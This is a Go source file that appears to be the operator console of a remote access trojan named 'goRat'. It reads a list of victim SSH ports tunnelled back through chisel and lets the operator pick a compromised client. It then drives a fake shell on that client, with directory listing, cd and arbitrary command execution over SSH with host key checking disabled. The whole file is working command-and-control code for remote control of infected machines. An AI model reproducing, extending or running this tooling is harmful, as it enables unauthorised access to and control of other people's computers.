package main

import (
	"fmt"
	"io/ioutil"
	"strings"

	"ASS/shared"

	"github.com/abiosoft/ishell"
	"github.com/fatih/color"
)

var (
	sPorts = "/tmp/goRat/SSH_Ports"
	cPorts = "/tmp/goRat/Control_Ports"

	blue   = color.New(color.FgHiBlue).SprintFunc()
	red    = color.New(color.FgHiRed).SprintFunc()
	green  = color.New(color.FgHiGreen).SprintFunc()
	yellow = color.New(color.FgHiYellow).SprintFunc()
)

func main() {
	shell := ishell.New()
	shell.SetPrompt(green("[Server]") + " $ ")

	shell.AddCmd(&ishell.Cmd{
		Name: "list",
		Help: "list all open goRat SSH ports mounted by chisel",
		Func: func(c *ishell.Context) {
			fileBytes, err := ioutil.ReadFile(sPorts)

			if err != nil {
				fmt.Println((green("[Server] ") + red(err)))
				return
			}

			sliceData := strings.Split(string(fileBytes), "\n")
			for _, s := range sliceData {
				if len(s) > 0 {
					fmt.Println(strings.Replace(s, "\r\n", "", -1))
				}
			}
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "select",
		Help: "connect to a open SSH port mounted by chisel",
		Func: func(c *ishell.Context) {
			fileBytes, err := ioutil.ReadFile(sPorts)

			if err != nil {
				fmt.Println(red(err))
				return
			}

			sliceData := strings.Split(string(fileBytes), "\n")
			if len(sliceData) == 0 {
				fmt.Println(green("[Server] ") + red("No clients to select!"))
				return
			}

			choice := c.MultiChoice(sliceData, "Select client to interact with:")
			slice := strings.Split(sliceData[choice], " ")
			session := slice[1]
			port := slice[3]
			quasiPTY(session, port)
		},
	})

	shell.Run()
}

func quasiPTY(sessionNum string, port string) {
	shell := ishell.New()

	// Prep fake shell
	out, _ := shared.RunCmd(`ssh -o "StrictHostKeyChecking no" localhost -p `+port+` "#goRat# pwd"`, false)
	shell.SetPrompt(yellow("[Session " + sessionNum + "] " + blue(string(out)) + " $ "))

	fileCompleter := func([]string) []string {
		glob, _ := shared.RunCmd(`ssh -o "StrictHostKeyChecking no" localhost -p `+port+` "#goRat# glob"`, false)
		return strings.Split(string(glob), "^")
	}

	shell.AddCmd(&ishell.Cmd{
		Name:      "cd",
		Help:      "Change Directory",
		Completer: fileCompleter,
		Func: func(c *ishell.Context) {
			arg := strings.Join(c.Args, " ")
			shared.RunCmd(`ssh -o "StrictHostKeyChecking no" localhost -p `+port+` "#goRat# cd `+arg+`"`, false)
			path, _ := shared.RunCmd(`ssh -o "StrictHostKeyChecking no" localhost -p `+port+` "#goRat# pwd"`, false)
			shell.SetPrompt(yellow("[Session " + sessionNum + "] " + blue(string(path)) + " $ "))
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "ls",
		Help: "List Directories",
		Func: func(c *ishell.Context) {
			glob, _ := shared.RunCmd(`ssh -o "StrictHostKeyChecking no" localhost -p `+port+` "#goRat# glob"`, false)
			array := strings.Split(string(glob), "^")
			for _, i := range array {
				fmt.Println(i)
			}
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "run",
		Help: "Run a Command",
		Func: func(c *ishell.Context) {
			arg := strings.Join(c.Args, " ")
			out, _ := shared.RunCmd(`ssh -o "StrictHostKeyChecking no" localhost -p `+port+` "`+arg+`"`, false)
			fmt.Println(string(out))
		},
	})

	// shell.NotFound()
	shell.Run()
}
